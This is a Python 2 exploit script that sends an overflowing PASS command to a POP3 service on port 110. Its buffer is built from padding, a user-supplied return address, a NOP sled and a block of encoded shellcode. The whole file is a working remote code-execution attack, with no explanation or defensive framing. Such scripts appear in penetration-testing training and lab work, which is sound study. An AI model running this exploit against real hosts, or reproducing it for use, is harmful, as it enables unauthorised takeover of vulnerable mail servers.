
#!/usr/bin/python
import socket
import sys

if len(sys.argv) != 4:
    print "\n[*] Usage: " + sys.argv[0] + " <ip_address> <EIP_offset> <EIP_address>\n"
    sys.exit(0)

s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
payload=("\xb8\xb0\x65\x51\xda\xda\xca\xd9\x74\x24\xf4\x5e\x31\xc9\xb1"
"\x52\x31\x46\x12\x03\x46\x12\x83\x76\x61\xb3\x2f\x8a\x82\xb1"
"\xd0\x72\x53\xd6\x59\x97\x62\xd6\x3e\xdc\xd5\xe6\x35\xb0\xd9"
"\x8d\x18\x20\x69\xe3\xb4\x47\xda\x4e\xe3\x66\xdb\xe3\xd7\xe9"
"\x5f\xfe\x0b\xc9\x5e\x31\x5e\x08\xa6\x2c\x93\x58\x7f\x3a\x06"
"\x4c\xf4\x76\x9b\xe7\x46\x96\x9b\x14\x1e\x99\x8a\x8b\x14\xc0"
"\x0c\x2a\xf8\x78\x05\x34\x1d\x44\xdf\xcf\xd5\x32\xde\x19\x24"
"\xba\x4d\x64\x88\x49\x8f\xa1\x2f\xb2\xfa\xdb\x53\x4f\xfd\x18"
"\x29\x8b\x88\xba\x89\x58\x2a\x66\x2b\x8c\xad\xed\x27\x79\xb9"
"\xa9\x2b\x7c\x6e\xc2\x50\xf5\x91\x04\xd1\x4d\xb6\x80\xb9\x16"
"\xd7\x91\x67\xf8\xe8\xc1\xc7\xa5\x4c\x8a\xea\xb2\xfc\xd1\x62"
"\x76\xcd\xe9\x72\x10\x46\x9a\x40\xbf\xfc\x34\xe9\x48\xdb\xc3"
"\x0e\x63\x9b\x5b\xf1\x8c\xdc\x72\x36\xd8\x8c\xec\x9f\x61\x47"
"\xec\x20\xb4\xc8\xbc\x8e\x67\xa9\x6c\x6f\xd8\x41\x66\x60\x07"
"\x71\x89\xaa\x20\x18\x70\x3d\x8f\x75\x79\x7f\x67\x84\x7d\x7e"
"\xc3\x01\x9b\xea\x23\x44\x34\x83\xda\xcd\xce\x32\x22\xd8\xab"
"\x75\xa8\xef\x4c\x3b\x59\x85\x5e\xac\xa9\xd0\x3c\x7b\xb5\xce"
"\x28\xe7\x24\x95\xa8\x6e\x55\x02\xff\x27\xab\x5b\x95\xd5\x92"
"\xf5\x8b\x27\x42\x3d\x0f\xfc\xb7\xc0\x8e\x71\x83\xe6\x80\x4f"
"\x0c\xa3\xf4\x1f\x5b\x7d\xa2\xd9\x35\xcf\x1c\xb0\xea\x99\xc8"
"\x45\xc1\x19\x8e\x49\x0c\xec\x6e\xfb\xf9\xa9\x91\x34\x6e\x3e"
"\xea\x28\x0e\xc1\x21\xe9\x3e\x88\x6b\x58\xd7\x55\xfe\xd8\xba"
"\x65\xd5\x1f\xc3\xe5\xdf\xdf\x30\xf5\xaa\xda\x7d\xb1\x47\x97"
"\xee\x54\x67\x04\x0e\x7d")

buffer='A' * int(sys.argv[2]) + sys.argv[3].decode('hex') + "\x90" * 16 + payload

try:
    print "\nSending evil buffer..."
    s.connect((sys.argv[1], 110))
    data=s.recv(1024)
    s.send('USER username\r\n')
    data=s.recv(1024)
    s.send('PASS ' + buffer + '\r\n')
    print "\nDone!"
except:
    print "Could not connect to POP3 on " + sys.argv[1]
